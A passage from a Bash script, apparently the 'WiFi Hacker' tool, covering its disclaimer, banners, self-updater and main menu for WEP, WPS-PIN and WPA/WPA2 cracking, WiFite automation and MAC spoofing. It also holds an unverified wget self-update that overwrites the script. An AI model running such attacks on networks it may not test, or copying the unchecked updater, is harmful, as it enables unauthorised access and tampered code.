################################################\n############################################################################\n\n\n\n\n\n############################################################################\n#   DISCLAIMER BEGIN   #####################################################\n############################################################################\n\n\nshowDisclaimer(){\n\n\tcurrentTask=\"showDisclaimer\"\n\tlastMenuID=\"showDisclaimer\"\n\n\tsessionCreatePaths\n\tsessionRemoveEmpty\n\n\tbannerSlim\n\n\t$cyan\n\techo \"\"\n\techo \"****************************************************************************************************\"\n\techo \"THIS WILL TERMINATE ANY ACTIVE INTERNET CONNECTION! IF YOU HAVE ISSUES CONNECTING TO THE INTERNET\"\n\techo \"AFTER AN ATTACK HAS BEEN PERFORMED, USE THE EXTRAS OPTION IN TOOLBAR TO START AND STOP SERVICES.\"\n\techo \"IF THIS DOES NOT WORK, THEN YOU CAN RESTART THIS SCRIPT, OR REBOOT THE MACHINE AND RETURN TO NORMAL.\"\n\techo \"****************************************************************************************************\"\n\techo \"\"\n\t$green\n\techo \"**********************************************************\"\n\techo \"YOU MUST AGREE TO THESE TERMS BEFORE USING THIS SOFTWARE!\"\n\techo \"**********************************************************\"\n\t$white\n\techo \"\"\n\techo \"By using this script, you are agreeing to the following terms:\"\n\techo \"\"\n\techo \"1) Not to be used for attacking access points that you do not have permission to test\"\n\techo \"\"\n\techo \"2) Stay within legal limits of transmission power, depending on your country laws\"\n\techo \"\"\n\techo \"3) Stay within legal limits of channel usage, depending on your country laws\"\n\techo \"\"\n\t$green\n\techo \"**********************************************************\"\n\techo \"YOU MUST AGREE TO THESE TERMS BEFORE USING THIS SOFTWARE!\"\n\techo \"**********************************************************\"\n\t$white\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"PLEASE PRESS \"\\\"\"Y\"\\\"\" AND ENTER TO ACCEPT AND CONTINUE\"\n\techo \"\"\n\n\tread agreeToDisclaimer\n\n\tcase \"$agreeToDisclaimer\" in\n\n\t\t\"\")\n\t\tbannerExit\n\t\t;;\n\n\t\t\"Y\" | \"y\")\n\t\tcheckForUpdates\n\t\tfixNegativeOneChannelError\n\t\t#initAirmon\n\t\tfixAirmonCompat\n\t\t#startNetworkManager\n\t\t#killNetworkManager\n\t\t#wpaSupplicantKill\n\t\t#initMonitorMode\n\t\t#stopMonitorMode\n\t\t#checkMultipleAdapters\n\t\tmenuMain\n\t\t;;\n\n\t\t*)\n\t\tbannerExit\n\t\t;;\n\n\tesac\n\n}\n\n\nisUnreleased(){\n\n\tcurrentTask=\"isUnreleased\"\n\tlastMenuID=\"isUnreleased\"\n\n\tsessionCreatePaths\n\tsessionRemoveEmpty\n\n\tbannerSlim\n\n\t$cyan\n\techo \"\"\n\techo \"****************************************************************************************************\"\n\techo \"THIS WILL TERMINATE ANY ACTIVE INTERNET CONNECTION! IF YOU HAVE ISSUES CONNECTING TO THE INTERNET\"\n\techo \"AFTER AN ATTACK HAS BEEN PERFORMED, USE THE EXTRAS OPTION IN TOOLBAR TO START AND STOP SERVICES.\"\n\techo \"IF THIS DOES NOT WORK, THEN YOU CAN RESTART THIS SCRIPT, OR REBOOT THE MACHINE AND RETURN TO NORMAL.\"\n\techo \"****************************************************************************************************\"\n\techo \"\"\n\t$green\n\techo \"**********************************************************\"\n\techo \"YOU MUST AGREE TO THESE TERMS BEFORE USING THIS SOFTWARE!\"\n\techo \"**********************************************************\"\n\techo \"\"\n\t$yellow\n\techo \"***THIS IS UNRELEASED AND SHOULD BE CONSIDERED A TEST VERSION***\"\n\techo \"***THIS IS UNRELEASED AND SHOULD BE CONSIDERED A TEST VERSION***\"\n\techo \"***THIS IS UNRELEASED AND SHOULD BE CONSIDERED A TEST VERSION***\"\n\techo \"***THIS IS UNRELEASED AND SHOULD BE CONSIDERED A TEST VERSION***\"\n\techo \"***THIS IS UNRELEASED AND SHOULD BE CONSIDERED A TEST VERSION***\"\n\techo \"***THIS IS UNRELEASED AND SHOULD BE CONSIDERED A TEST VERSION***\"\n\techo \"***THIS IS UNRELEASED AND SHOULD BE CONSIDERED A TEST VERSION***\"\n\techo \"***THIS IS UNRELEASED AND SHOULD BE CONSIDERED A TEST VERSION***\"\n\techo \"\"\n\t$green\n\techo \"**********************************************************\"\n\techo \"YOU MUST AGREE TO THESE TERMS BEFORE USING THIS SOFTWARE!\"\n\techo \"**********************************************************\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\t$white\n\techo \"PLEASE PRESS \"\\\"\"Y\"\\\"\" AND ENTER TO ACCEPT AND CONTINUE\"\n\techo \"\"\n\n\tread agreeToDisclaimer\n\n\tcase \"$agreeToDisclaimer\" in\n\n\t\t\"\")\n\t\tbannerExit\n\t\t;;\n\n\t\t\"Y\" | \"y\")\n\t\tcheckForUpdates\n\t\tfixNegativeOneChannelError\n\t\t#initAirmon\n\t\tfixAirmonCompat\n\t\t#startNetworkManager\n\t\t#killNetworkManager\n\t\t#wpaSupplicantKill\n\t\t#initMonitorMode\n\t\t#stopMonitorMode\n\t\t#checkMultipleAdapters\n\t\tmenuMain\n\t\t;;\n\n\t\t*)\n\t\tbannerExit\n\t\t;;\n\n\tesac\n\n}\n\n\n############################################################################\n#   DISCLAIMER END   #######################################################\n############################################################################\n\n\n\n\n\n############################################################################\n#   BANNERS BEGIN   ########################################################\n############################################################################\n\n\nbanner(){\n\n\tsetWindowTitle\n\n\tcurrentTask=\"banner\"\n\n\tclear\n\t$blue\n\techo \"---------------------    ****************************************************************    ----------------------\"\n\techo \"|  [M] Main Menu    |    * WiFi Hacker v$versionBase  /  esc0rtd3w 2019  /  github.com/esc0rtd3w *    | [X] Exit           |\"\n\techo \"---------------------    ****************************************************************    ----------------------\"\n\t$yellow\n\techo \"-------------------------------------------------------------------------------------------------------------------\"\n\techo \"| Interfaces: $interfacesFound  |  Interface Mode: $interfaceMode  |  [A] Advanced  |  Sessions: [S] Save  [L] Load  |  [E] Extras  [H] Help  |\"\n\techo \"-------------------------------------------------------------------------------------------------------------------\"\n\t#echo \"\"\n\t$white\n\n}\n\n\nbannerNoMenu(){\n\n\tcurrentTask=\"bannerNoMenu\"\n\n\tsetWindowTitle\n\n\tclear\n\t$blue\n\techo \"---------------------    ****************************************************************    ----------------------\"\n\techo \"|  [ CTRL+C ] Main  |    * WiFi Hacker v$versionBase  /  esc0rtd3w 2019  /  github.com/esc0rtd3w *    | [CTRL+C x2 ] Exit  |\"\n\techo \"---------------------    ****************************************************************    ----------------------\"\n\t$yellow\n\techo \"-------------------------------------------------------------------------------------------------------------------\"\n\techo \"| Interfaces: $interfacesFound  |  Interface Mode: $interfaceMode  |  [A] Advanced  |  Sessions: [S] Save  [L] Load  |  [E] Extras  [H] Help  |\"\n\techo \"-------------------------------------------------------------------------------------------------------------------\"\n\t#echo \"\"\n\t$white\n\n}\n\n\nbannerMain(){\n\n\tcurrentTask=\"bannerMain\"\n\n\tsetWindowTitle\n\n\tclear\n\t$blue\n\techo \"---------------------    ****************************************************************    ----------------------\"\n\techo \"|  [ ]              |    * WiFi Hacker v$versionBase  /  esc0rtd3w 2019  /  github.com/esc0rtd3w *    | [CTRL+C    ] Exit  |\"\n\techo \"---------------------    ****************************************************************    ----------------------\"\n\techo \"-------------------------------------------------------------------------------------------------------------------\"\n\t$yellow\n\techo \"| Interfaces: $interfacesFound  |  Interface Mode: $interfaceMode  |  [A] Advanced  |  Sessions: [S] Save  [L] Load  |  [E] Extras  [H] Help  |\"\n\techo \"-------------------------------------------------------------------------------------------------------------------\"\n\t#echo \"\"\n\t$white\n\n}\n\nbannerMenu(){\n\n\tcurrentTask=\"bannerMenu\"\n\n\tsetWindowTitle\n\n\tclear\n\t$blue\n\techo \"---------------------    ****************************************************************    ----------------------\"\n\techo \"|  [ ]              |    * WiFi Hacker v$versionBase  /  esc0rtd3w 2019  /  github.com/esc0rtd3w *    | [CTRL+C    ] Exit  |\"\n\techo \"---------------------    ****************************************************************    ----------------------\"\n\t$yellow\n\techo \"-------------------------------------------------------------------------------------------------------------------\"\n\techo \"| Interfaces: $interfacesFound  |  Interface Mode: $interfaceMode  |  [A] Advanced  |  Sessions: [S] Save  [L] Load  |  [E] Extras  [H] Help  |\"\n\techo \"-------------------------------------------------------------------------------------------------------------------\"\n\t#echo \"\"\n\t$white\n\n}\n\nbannerSlim(){\n\n\tcurrentTask=\"bannerSlim\"\n\n\tsetWindowTitle\n\n\tclear\n\t$blue\n\techo \"---------------------    ****************************************************************    ----------------------\"\n\techo \"|  [ ]              |    * WiFi Hacker v$versionBase  /  esc0rtd3w 2019  /  github.com/esc0rtd3w *    | [CTRL+C    ] Exit  |\"\n\techo \"---------------------    ****************************************************************    ----------------------\"\n\t$white\n\n}\n\n\nbannerStats(){\n\n\tcurrentTask=\"bannerStats\"\n\n\t$cyan\n\techo \"-------------------------------------------------------------------------------------------------------------------\"\n\techo \"Interface: $interfaceName / MAC: $macAddressMonitor / ESSID: $essid / BSSID: $bssid / Channel: $channel\"\n\techo \"-------------------------------------------------------------------------------------------------------------------\"\n\techo \"\"\n\t$white\n\n}\n\nbannerExit(){\n\n\tcurrentTask=\"bannerExit\"\n\n\tsessionWriteEndCurrent\n\n\tsessionRemoveEmpty\n\n\tforceDisconnectWifi\n\n\tclear\n\t$blue\n\techo \"Thank You For Playing Fair ;)\"\n\techo \"\"\n\techo \"esc0rtd3w 2019\"\n\techo \"\"\n\techo \"\"\n\t$cyan\n\techo \"View My Other Projects On GitHub:\"\n\techo \"\"\n\techo \"https://github.com/esc0rtd3w\"\n\techo \"\"\n\techo \"\"\n\n\texit\n\n}\n\nbannerExitUpdate(){\n\n\tcurrentTask=\"bannerExitUpdate\"\n\n\tclear\n\t$green\n\techo \"The WiFi Hacker Script Has Been Updated To Version $versionRemote\"\n\techo \"\"\n\techo \"The New Script Is Located At $initPath/$newVersionScript\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"To launch the new script type the following two lines into this terminal WITHOUT QUOTES\"\n\techo \"\"\n\techo \"\\\"chmod a+x $newVersionScript\\\"\"\n\techo \"\"\n\techo \"\\\"./$newVersionScript\\\"\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\t$blue\n\techo \"Thank You For Playing Fair ;)\"\n\techo \"\"\n\techo \"esc0rtd3w 2019\"\n\techo \"\"\n\techo \"\"\n\t$cyan\n\techo \"View My Other Projects On GitHub:\"\n\techo \"\"\n\techo \"https://github.com/esc0rtd3w\"\n\techo \"\"\n\techo \"\"\n\n\texit\n\n}\n\n\n############################################################################\n#   BANNERS END   ##########################################################\n############################################################################\n\n\n\n\n\n############################################################################\n#   GLOBAL TEXT BEGIN   ####################################################\n############################################################################\n\n\n# Usage: doSleepMessage \"message\" \"time\" \"color\"\n# Usage Example: doSleepMessage \"Please Wait....\" \"5\" \"$red\"\ndoSleepMessage(){\n\n\tmessage=\"$1\"\n\ttime=\"$2\"\n\tcolor=\"$3\"\n\n\tcurrentTask=\"doSleepMessage\"\n\n\tbanner\n\tbannerStats\n\t$color\n\techo \"$message\"\n\tsleep $time\n\n}\n\n\n############################################################################\n#   GLOBAL TEXT END   ######################################################\n############################################################################\n\n\n\n\n\n############################################################################\n#   UPDATE STUFF BEGIN   ###################################################\n############################################################################\n\n\ncheckForUpdates(){\n\n\tcurrentTask=\"checkForUpdates\"\n\n\tcheckConnectionStatus\n\n\t# If a blank entry was made to skip update then this value should be 1\n\tcase \"$skipUpdate\" in\n\n\t\t\"0\")\n\t\t# If connection can connect to internet, check for update\n\t\tcase \"$ipStatus\" in\n\n\t\t\t\"1\")\n\t\t\tmenuUpdate\n\t\t\t;;\n\n\t\tesac\n\n\t\t;;\n\n\tesac\n\n}\n\n\nmenuUpdate(){\n\n\tcurrentTask=\"menuUpdate\"\n\n\t# Check remote server for update version\n\tcase \"$updateChecked\" in\n\n\t\t\"0\")\n\n\t\t# Make sure there is an active internet connection\n\t\tcase \"$ipStatus\" in\n\n\t\t\t\"1\")\n\t\t\tcheckUpdate\n\t\t\t;;\n\n\t\tesac\n\n\t\t;;\n\n\tesac\n\n\t# Set default choice\n\tupdateChoice=\"\"\n\t\n\tbannerSlim\n\n\techo \"\"\n\t#echo \"Update Menu\"\n\t#echo \"\"\n\t#echo \"\"\n\t#echo \"\"\n\n\t# If remote version is not newer, then local version should be green\n\tcase \"$newUpdateAvailable\" in\n\n\t\t\"0\")\n\t\t$green\n\t\t;;\n\n\t\t\"1\")\n\t\t$yellow\n\t\t;;\n\n\t\t\"2\")\n\t\t$magenta\n\t\t;;\n\n\tesac\n\n\techo \"Local Version: v$versionBase\"\n\techo \"\"\n\n\t# If remote version is newer, then local version should not be green\n\tcase \"$newUpdateAvailable\" in\n\n\t\t\"0\")\n\t\t$yellow\n\t\t;;\n\n\t\t\"1\")\n\t\t$green\n\t\t;;\n\n\t\t\"2\")\n\t\t$magenta\n\t\t;;\n\n\tesac\n\n\techo \"Remote Version: v$versionRemote\"\n\t$white\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"Choose an option and press ENTER:\"\n\techo \"\"\n\techo \"\"\n\techo \"1) Check For New Update\"\n\techo \"\"\n\techo \"2) Apply New Update\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\t$cyan\n\techo \"AUTOMATICALLY CONTINUING IN 10 SECONDS....\"\n\t$white\n\techo \"\"\n\n\t#read updateChoice\n\tread -t 10 updateChoice\n\n\tcase \"$updateChoice\" in\n\n\t\t\"\")\n\t\tskipUpdate=\"1\"\n\t\treturnToUpdatePage=\"0\"\n\t\t#read pause\n\t\t;;\n\n\t\t\"1\")\n\t\t# Reset updateChecked Flag\n\t\tupdateChecked=\"0\"\n\n\t\treturnToUpdatePage=\"1\"\n\t\tcheckUpdate\n\t\t;;\n\n\t\t\"2\")\n\n\t\tcase \"$newUpdateAvailable\" in\n\n\t\t\t# No Update Available / Remote Version Matches Local\n\t\t\t\"0\")\n\t\t\treturnToUpdatePage=\"0\"\n\t\t\t\n\t\t\tbanner\n\t\t\t$red\n\t\t\techo \"\"\n\t\t\techo \"No Updates Are Available!\"\n\t\t\techo \"\"\n\t\t\techo \"\"\n\t\t\techo \"\"\n\t\t\techo \"\"\n\t\t\techo \"\"\n\t\t\techo \"\"\n\t\t\t$cyan\n\t\t\techo \"Continuing To Main Menu In 5 Seconds....\"\n\t\t\techo \"\"\n\t\t\techo \"\"\n\n\t\t\tread -t 5 noUpdateAvailable\n\t\t\t;;\n\n\t\t\t# Update Is Available / Remote Version Is Higher Than Local\n\t\t\t\"1\")\n\t\t\treturnToUpdatePage=\"0\"\n\t\t\tgetUpdate\n\t\t\t;;\n\n\t\t\t# Dev Build / Remote Version Is Lower Than Local\n\t\t\t\"2\")\n\t\t\treturnToUpdatePage=\"0\"\n\n\t\t\tbanner\n\t\t\t$magenta\n\t\t\techo \"\"\n\t\t\techo \"You Have An Unreleased Developer Version\"\n\t\t\techo \"\"\n\t\t\techo \"\"\n\t\t\techo \"\"\n\t\t\t$green\n\t\t\techo \"\"\n\t\t\techo \"* TO FORCE UPDATE FROM REMOTE VERSION PRESS \\\"F\\\" AND ENTER *\"\n\t\t\techo \"\"\n\t\t\techo \"\"\n\t\t\techo \"\"\n\t\t\techo \"\"\n\t\t\t$cyan\n\t\t\techo \"Continuing To Main Menu In 10 Seconds....\"\n\t\t\techo \"\"\n\t\t\techo \"\"\n\n\t\t\tread -t 10 noUpdateAvailable\n\n\t\t\t# Check for Forced Update Flag\n\t\t\tcase \"$noUpdateAvailable\" in\n\n\t\t\t\t\"F\" | \"f\")\n\t\t\t\treturnToUpdatePage=\"0\"\n\t\t\t\tgetUpdate\n\t\t\t\t;;\n\n\t\t\tesac\n\t\t\t;;\n\n\t\tesac\n\t\t;;\n\n\t\t\"x\" | \"X\")\n\t\tbannerExit\n\t\t;;\n\n\tesac\n\n}\n\n\ncheckUpdate(){\n\n\tcurrentTask=\"checkUpdate\"\n\t\n\twget -O \"$updateTemp\" $updateMaster\n\n\tversionRemoteTemp=$(cat $updateTemp | grep versionBase= | cut -d \"\\\"\" -f2 | head -c 3)\n\n\tversionRemote=\"$versionRemoteTemp\"\n\n\tcase \"$isDebugMode\" in\n\t\t\"1\")\n\t\techo \"versionRemote: $versionRemote\"\n\t\tread pause\n\t\t;;\n\tesac\n\n\tcleanVersionNumbers\n\tcompareUpdateVersions\n\n\t#echo \"newUpdateAvailable: $newUpdateAvailable\"\n\t#read pause\n\n\trm $updateTemp\n\n\tupdateChecked=\"1\"\n\n\tcase \"$returnToUpdatePage\" in\n\n\t\t\"1\")\n\t\tmenuUpdate\n\t\t;;\n\t\n\tesac\n\n}\n\n\ngetUpdate(){\n\n\tcurrentTask=\"getUpdate\"\n\t\n\t# Get Base Script Name\n\t#newVersionScript=$(printf '%s\\n' \"${0##*/}\")\n\tnewVersionScript=$(basename -- \"$0\")\n\t\n\t# Download New Script\n\twget -O \"$initPath/$newVersionScript.tmp\" $updateMaster\n\n\t#read pause\n\n\t# Make Backup of Original Script\n\tcp \"$initPath/$newVersionScript\" \"$initPath/$newVersionScript.BACKUP\"\n\n\t# Remove Old Script\n\trm -f \"$initPath/$newVersionScript\"\n\n\t# Copy New Script\n\tcp \"$initPath/$newVersionScript.tmp\" \"$initPath/$newVersionScript\"\n\n\t# Remove Temp Script\n\trm -f \"$initPath/$newVersionScript.tmp\"\n\n\t#read pause\n\n\tbannerExitUpdate\n\n}\n\n\ncleanVersionNumbers(){\n\n\tcurrentTask=\"cleanUpdateVersion\"\n\n\tversionBaseClean=$(echo $versionBase | sed -e 's/\\.//')\n\n\tversionRemoteClean=$(echo $versionRemote | sed -e 's/\\.//')\n\n\t#echo \"Local Version: $versionBaseClean\"\n\t#echo \"Remote Version: $versionRemoteClean\"\n\t#read pause\n\n}\n\n\ncompareUpdateVersions(){\n\n\t# Compare Local and Remote Versions (0 = Not Greater / 1 = Greater) (Not working?? 20170102)\n\t#versionCompare=$(echo \"$versionBaseClean <= $versionRemoteClean\" | awk '{print ($versionBaseClean <= $versionRemoteClean)}')\n\n\tif [ $versionRemoteClean -lt $versionBaseClean ]; then\n\t\t\n\t\tnewUpdateAvailable=\"2\"\n\t\tisDevBuild=\"1\"\n\t\n\tfi\n\t\n\tif [ $versionRemoteClean -gt $versionBaseClean ]; then\n\n\t\tnewUpdateAvailable=\"1\"\n\t\tisDevBuild=\"0\"\n\t\n\tfi\n\n\tif [ $versionRemoteClean -eq $versionBaseClean ]; then\n\t\t\n\t\tnewUpdateAvailable=\"0\"\n\t\tisDevBuild=\"0\"\n\t\n\tfi\n\n}\n\n\n############################################################################\n#   UPDATE STUFF END   #####################################################\n############################################################################\n\n\n\n\n\n############################################################################\n#   OTHER MISC STUFF BEGIN   ###############################################\n############################################################################\n\n\ncheckRootStatus(){\n\n\tuserPriv=\"none\"\n\n\tisRoot=$(whoami | grep root)\n\n\tcase \"$isRoot\" in\n\n\t\t\"root\")\n\t\tuserPriv=\"root\"\n\n\tesac\n\n\tif [ \"$userPriv\" != \"root\" ]; then\n\t\tnoRootAccess\n\tfi\n\n}\n\n\n\nnoRootAccess(){\n\n\tbanner\n\tbannerStats\n\n\t$red\n\techo \"Yikes! No Root Access!\"\n\t$white\n\techo \"\"\n\techo \"\"\n\techo \"I Currently Have Nothing Scripted To Handle This :(\"\n\techo \"\"\n\techo \"Please login as a root user and try again!\"\n\techo \"\"\n\techo \"\"\n\techo \"Press ENTER to exit this script....\"\n\techo \"\"\n\techo \"\"\n\n\tread pause\n\n\n\tbannerExit\n\n}\n\n\ncheckConnectionStatus(){\n\n\tipStatus=\"0\"\n\tipStatusText=\"None\"\n\n\tipStatusTemp=$(ping -c 1 google.com | grep \"1 received\")\n\n\tipStatus=$(echo \"$ipStatusTemp\" | cut -c1)\n\n\n\tcase \"$ipStatus\" in\n\n\t\t\"1\")\n\t\tipStatus=\"1\"\n\t\tipStatusText=\"Wifi\"\n\t\t;;\n\n\tesac\n\n\tcase \"$ipStatusText\" in\n\n\t\t\"None\")\n\t\tipStatus=\"0\"\n\t\t;;\n\n\tesac\n\n\t#echo \"$ipStatusText\"\n\n\t#read pause\n\n}\n\n\nfixAirmonCompat(){\n\n\t#$terminal airmon-ng check kill&\n\tairmon-ng check kill&\n\t#airmon-ng check kill&\n\n}\n\n\ncheckWifiandDisplayMessage(){\n\n\tcase \"$ipStatusText\" in\n\n\t\t\"Wifi\")\n\t\tbanner\n\t\techo \"\"\n\t\techo \"YOU MUST DISCONNECT FROM WIFI BEFORE CONTINUING!!!!\"\n\t\techo \"\"\n\t\techo \"\"\n\t\techo \"PRESS ENTER TO RETURN TO MAIN MENU....\"\n\t\techo \"\"\n\t\techo \"\"\n\n\t\tread pause\n\n\t\tmenuMain\n\t\t;;\n\n\tesac\n\n}\n\n\n# Tries fixing issues with connection staying persistant to WiFi\nforceDisconnectWifi() {\n\n\t#stopMonitorMode\n\t#killNetworkManager\n\tNetworkManager\n\t#disableChannelHopping\n\tenableChannelHopping\n\n}\n\n\n############################################################################\n#   OTHER MISC STUFF END   #################################################\n############################################################################\n\n\n\n\n\n############################################################################\n#   MENUS: MAIN BEGIN   ####################################################\n############################################################################\n\n\nloadMenuHotkeys(){\n\ncase \"$hotkeyInput\" in\n\n\t\"M\" | \"m\")\n\n\t# Check for resetSpoofStatus Flag\n\tcase \"$resetSpoofStatus\" in\n\n\t\t\"1\")\n\t\tspoofStatus=\"0\"\n\t\t;;\n\n\tesac\n\n\tkillAll\n\tstopMonitorMode\n\tmenuMain\n\t;;\n\n\t\"A\" | \"a\")\n\tmenuAdvanced\n\t;;\n\n\t\"S\" | \"s\")\n\tcheckForEmptyEncryptionType\n\n\tcase \"$bssid\" in\n\n\t\t\"\")\n\t\tmenuMain\n\t\t;;\n\n\tesac\n\n\tif [ \"$bssid\" != \"\" ]; then\n\t\tmenuSessionSave\n\tfi\n\t;;\n\n\t\"L\" | \"l\")\n\tcheckForEmptyEncryptionType\n\tmenuSessionLoad\n\t;;\n\n\t\"H\" | \"h\")\n\tmenuHelp\n\t;;\n\n\t\"E\" | \"e\")\n\n\tcase \"$lastMenuID\" in\n\n\t\t\"menuMain\")\n\t\tmenuMain\n\t\t;;\n\n\t\t*)\n\t\tmenuExtras\n\t\t;;\n\n\tesac\n\t\n\t;;\n\n\t\"X\" | \"x\")\n\tkillAll\n\tstopMonitorMode\n\tbannerExit\n\t;;\n\nesac\n\n}\n\n\nmenuMain(){\n\n\tcurrentTask=\"menuMain\"\n\tlastMenuID=\"menuMain\"\n\n\t# Create temp folder to use for text dumps, etc\n\tmkdir $whTemp\n\n\tcheckRootStatus\n\tsessionCreatePaths\n\tsessionRemoveEmpty\n\n\tcheckMultipleAdapters\n\tcheckInterfaceMode\n\n\tcheckConnectionStatus\n\n\tcase \"$ipStatus\" in\n\n\t\t\"1\")\n\t\tbanner\n\t\techo \"\"\n\t\techo \"Loading Menu....\"\t\n\t\techo \"\"\n\t\techo \"\"\n\n\t\tforceDisconnectWifi\n\t\tcheckConnectionStatus\n\n\t\tsleep 3\n\n\t\tmenuMain\n\t\t;;\n\n\t\t\"0\")\n\t\tbanner\n\t\techo \"\"\n\t\t#echo \"Welcome to the WiFi Hacker script!\"\n\t\techo \"Compatible with all WEP/WPA/WPA2/WPS protected WiFi routers.\"\n\t\techo \"\"\n\t\t$red\n\t\techo \"**********************************************************************\"\n\t\techo \"YOU MUST DISCONNECT FROM ANY WIRELESS CONNECTIONS BEFORE CONTINUING!!!\"\n\t\techo \"**********************************************************************\"\n\t\techo \"\"\n\n\t\tcase \"$ipStatus\" in\n\t\t\t\"0\")\n\t\t\t$green\n\t\t\t;;\n\n\t\t\t\"1\")\n\t\t\t$red\n\t\t\t;;\n\t\tesac\n\t\techo \"You are currently connected to: $ipStatusText\"\n\t\t$white\n\t\techo \"\"\n\t\techo \"\"\n\t\t#$cyan\n\t\techo \"0) Auto Mode    (Uses WiFite In Full Automatic Mode. Applies To All Encryption Types)\"\n\t\t#$white\n\t\techo \"\"\n\t\techo \"1) WEP Mode     (Menu Options Can Be Selected To Easily Circumvent Any WEP Connection)\"\n\t\techo \"\"\n\t\techo \"2) WPS Mode     (Pin Vulnerability Attack. May Also Have WPA, WPA2, or WEP Displayed)\"\n\t\techo \"\"\n\t\techo \"3) WPA Mode     (Capture 4-way Handshake, Dictionary Attack, Bruteforce, Custom Wordlist, and More)\"\n\t\techo \"\"\n\t\techo \"4) WPA2 Mode    (Identical To WPA Attacks, Except Target Encryption Type)\"\n\t\techo \"\"\n\t\techo \"\"\n\t\techo \"\"\n\t\techo \"Select a mode from above and press Enter:\"\n\t\techo \"\"\n\n\t\tread getMode\n\n\t\thotkeyInput=\"$getMode\"\t\n\n\t\tloadMenuHotkeys \"$hotkeyInput\"\n\n\t\tcase \"$getMode\" in\n\n\t\t\t\"\")\n\t\t\tmenuMain\n\t\t\t;;\n\n\t\t\t\"0\")\n\t\t\tcheckConnectionStatus\n\t\t\tcheckWifiandDisplayMessage\n\t\t\tmenuAttacksAllWifiteAuto\n\t\t\tmenuMain\n\t\t\t;;\n\n\t\t\t\"1\")\n\t\t\tcheckConnectionStatus\n\t\t\tcheckWifiandDisplayMessage\n\t\t\tmkdir $capturePathWEP\n\t\t\tencryptionType=\"wep\"\n\t\t\tencryptionTypeText=\"WEP\"\n\t\t\tcheckSpoofStatus\n\t\t\tmenuAuto\n\t\t\t;;\n\n\t\t\t\"2\")\n\t\t\tcheckConnectionStatus\n\t\t\tcheckWifiandDisplayMessage\n\t\t\tmkdir $capturePathWPS\n\t\t\tencryptionType=\"wps\"\n\t\t\tencryptionTypeText=\"WPS\"\n\t\t\tcheckSpoofStatus\n\t\t\tmenuAuto\n\t\t\t;;\n\n\t\t\t\"3\")\n\t\t\tcheckConnectionStatus\n\t\t\tcheckWifiandDisplayMessage\n\t\t\tmkdir $capturePathWPA\n\t\t\tencryptionType=\"wpa\"\n\t\t\tencryptionTypeText=\"WPA\"\n\t\t\tcheckSpoofStatus\n\t\t\tmenuAuto\n\t\t\t;;\n\n\t\t\t\"4\")\n\t\t\tcheckConnectionStatus\n\t\t\tcheckWifiandDisplayMessage\n\t\t\tmkdir $capturePathWPA2\n\t\t\tencryptionType=\"wpa2\"\n\t\t\tencryptionTypeText=\"WPA2\"\n\t\t\tcheckSpoofStatus\n\t\t\tmenuAuto\n\t\t\t;;\n\n\t\t\t*)\n\t\t\tmenuMain\n\t\t\t;;\n\n\t\tesac\n\t\t;;\n\n\tesac\n\n\t#menuMain\n}\n\n\nmenuAuto(){\n\n\tcurrentTask=\"menuAuto\"\n\tlastMenuID=\"menuAuto\"\n\n\tcase \"$encryptionTypeText\" in\n\n\t\t\"Empty\")\n\t\tmenuMain\n\t\t;;\n\n\tesac\n\n\t#sessionCopyNewCaptureFiles\n\tsessionRemoveEmpty\n\n\tcleanTempScanResultsFile \"all\"\n\n\tcheckInterfaceMode\n\n\tbanner\n\tbannerStats\n\t\n\t$green\n\techo \"\"\n\techo \"You are ready to begin the $encryptionTypeText attack!\"\n\techo \"\"\n\t$white\n\n\tcase \"$encryptionTypeText\" in\n\n\t\t\"WEP\")\n\t\techo \"To perform a fully automated attack, type AUTOWEP end press ENTER\"\n\t\t;;\n\n\t\t\"WPS\")\n\t\techo \"To perform a fully automated attack, type AUTOWPS end press ENTER\"\n\t\t;;\n\n\t\t\"WPA\")\n\t\techo \"To perform a fully automated attack, type AUTOWPA end press ENTER\"\n\t\t;;\n\n\t\t\"WPA2\")\n\t\techo \"To perform a fully automated attack, type AUTOWPA2 end press ENTER\"\n\t\t;;\n\n\tesac\n\n\techo \"\"\n\techo \"YOU MAY NOW OPTIONALLY PRESS THE \\\"W\\\" KEY ON KEYBOARD TO YOUR SPOOF MAC ADDRESS\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"The next step will run an airodump-ng session in a new window.\"\n\techo \"\"\n\techo \"Once you enter all required info, the new window will be closed\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"Press ENTER to clear the current session and select a target....\"\n\techo \"\"\n\techo \"YOU MAY ALSO PRESS THE \\\"P\\\" KEY ON KEYBOARD TO LOAD PREVIOUS SESSION\"\n\techo \"\"\n\n\tread readyForAirodumpScan\n\n\thotkeyInput=\"$readyForAirodumpScan\"\n\n\tloadMenuHotkeys \"$hotkeyInput\"\t\n\n\tcase \"$readyForAirodumpScan\" in\n\n\t\t\"\")\n\t\tkillAll\n\t\tcheckForEmptyEncryptionType\n\n\t\t# Run wash if WPS\n\t\tcase \"$encryptionTypeText\" in\n\n\t\t\t\"WPS\")\n\t\t\t#$terminal wash -i $interfaceMonitor -o \"$washFile\" -C\n\t\t\t;;\n\n\t\tesac\n\n\t\tautoModeNoPreviousSession\n\t\t;;\n\n\t\t\"P\" | \"p\")\n\t\tcheckForEmptyEncryptionType\n\n\t\tcheckForEmptyCredentials \"bssid\"\n\t\tcheckForEmptyCredentials \"essid\"\n\t\tcheckForEmptyCredentials \"channel\"\n\n\t\tautoModeUsePreviousSession\n\t\t;;\n\n\t\t\"W\" | \"w\")\n\t\t#returnTo=\"menuAuto\"\n\t\tspoofMacAddress\n\t\tmenuAuto\n\t\t;;\n\n\t\t\"autowep\" | \"AUTOWEP\" | \"AutoWEP\" | \"AutoWep\" | \"autoWEP\" | \"autoWep\")\n\t\tmenuAttacksWEPWifiteAuto\n\t\t;;\n\n\t\t\"autowps\" | \"AUTOWPS\" | \"AutoWPS\" | \"AutoWps\" | \"autoWPS\" | \"autoWps\")\n\t\tmenuAttacksWPSWifiteAuto\n\t\t;;\n\n\t\t\"autowpa\" | \"AUTOWPA\" | \"AutoWPA\" | \"AutoWpa\" | \"autoWPA\" | 